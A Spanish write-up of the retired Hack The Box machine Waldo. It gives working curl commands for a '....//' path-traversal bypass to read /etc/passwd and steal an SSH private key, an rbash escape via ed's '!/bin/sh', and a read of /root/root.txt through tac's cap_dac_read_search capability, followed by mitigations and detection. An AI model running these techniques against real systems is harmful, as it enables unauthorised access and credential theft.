---
machine: Waldo
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, lfi, capabilities, rbash, privesc]
---

# Waldo — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

List Manager usa cuatro scripts PHP (`dirRead`, `fileRead`, `fileWrite`, `fileDelete`) que reciben rutas. `dirRead` y `fileRead` eliminan `../` con `str_replace`, pero la sustitución no es recursiva: `....//` se convierte en `../`. Con ese bypass se lista la raíz, se lee `/etc/passwd` y se obtiene `/home/nobody/.ssh/.monitor`, una clave privada. Esa clave entra por SSH como `nobody` en un contenedor Alpine. Desde ahí, la misma clave autentica como `monitor` en `localhost` y entrega una `rbash`; el binario `red` enlaza a `ed` sin restricciones y `!/bin/sh` escapa. `monitor` tiene `tac` con `cap_dac_read_search`, suficiente para leer `/root/root.txt`; no hay shell de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 7.5.
- `80` nginx 1.12.2, List Manager.
- `8888` filtrado desde fuera; SSH del contenedor.

La web permite crear listas y añadir elementos. Las peticiones van a `dirRead.php`, `fileRead.php`, `fileWrite.php` y `fileDelete.php`.

## Enumeración

`dirRead.php` recibe `path` y `fileRead.php` recibe `file`. El código fuente se obtiene leyendo los propios PHP:

```bash
curl -s -X POST -d 'file=dirRead.php' http://<IP>/fileRead.php | jq -r .file
```

Ambos aplican:

```php
$_POST['path'] = str_replace(array("../", "..\\"), "", $_POST['path']);
```

`str_replace` hace una sola pasada: `....//` se convierte en `../`. Se lista la raíz y se lee `/etc/passwd`:

```bash
curl -s -X POST -d 'path=....//....//....//' http://<IP>/dirRead.php | jq -rc .
curl -s -X POST -d 'file=....//....//....//etc/passwd' http://<IP>/fileRead.php | jq -r .file
```

`fileRead` bloquea la cadena `user.txt`, pero no impide leer `/home/nobody/.ssh/.monitor`. Se guarda la clave y se entra:

```bash
curl -s -X POST -d 'file=....//....//....//home/nobody/.ssh/.monitor' \
  http://<IP>/fileRead.php | jq -r .file > id_monitor
chmod 600 id_monitor
ssh -i id_monitor nobody@<IP>
```

## Movimiento lateral

`/etc/ssh/sshd_config` del contenedor escucha en `8888` y solo permite a `nobody`; el host reenvía el `22` externo. La clave `.monitor` también autentica como `monitor` en `localhost`:

```bash
ssh -i /home/nobody/.ssh/.monitor monitor@localhost
```

La shell es `rbash`, con `PATH` limitado a `/home/monitor/bin` y `app-dev`; no permite `cd` ni comandos fuera de esa ruta.

## Escalada de privilegios

En `bin`, `red` es un enlace a `/bin/ed` sin la restricción de `red`. `ed` permite ejecutar comandos con `!`:

```text
$ red
!/bin/sh
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ya fuera de `rbash`, `getcap -r /` muestra:

```text
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

`tac` invierte el orden de las líneas y puede leer cualquier archivo:

```bash
tac /root/root.txt
```

Para archivos de varias líneas, `tac archivo | tac` restaura el orden. No se obtiene una shell de root: el objetivo es la lectura completa del disco.

## Evidencia

- Respuesta de `dirRead.php` con la raíz del contenedor.
- `/etc/passwd` y la clave `.monitor` leídos con `....//`.
- SSH como `nobody` y `monitor@localhost`.
- `rbash` y escape con `red` → `!/bin/sh`.
- `getcap` con `tac` y lectura de `/root/root.txt`.

## Lecciones aprendidas

- `str_replace` no es recursivo; los filtros de traversal deben normalizar la ruta.
- Un directorio `.ssh` oculto puede contener una clave con más alcance del esperado.
- `rbash` no es una sandbox si el `PATH` incluye binarios que ejecutan comandos.
- Las capabilities son una alternativa sigilosa al setuid.
- El objetivo de una máquina puede ser lectura de root, no una shell.

## Mitigaciones y detección

- Resolver rutas con `realpath` y comprobar que quedan dentro del webroot.
- No confiar en listas negras de `../`; usar allowlist de nombres.
- No reutilizar claves SSH entre cuentas y contenedores.
- Restringir `rbash` a binarios realmente limitados; no enlazar `ed` sin restricciones.
- Auditar capabilities con `getcap -r /` y eliminar `cap_dac_read_search` de herramientas genéricas.
- Detectar peticiones con `....//`, lectura de `.ssh` y ejecución de `tac` sobre `/root`.

## Referencias

- [0xdf — Waldo](https://0xdf.gitlab.io/2018/12/15/htb-waldo.html)
- [IppSec — Waldo](https://www.youtube.com/watch?v=1klneIHECqY)
- [Hack The Box — Waldo](https://app.hackthebox.com/machines/waldo)
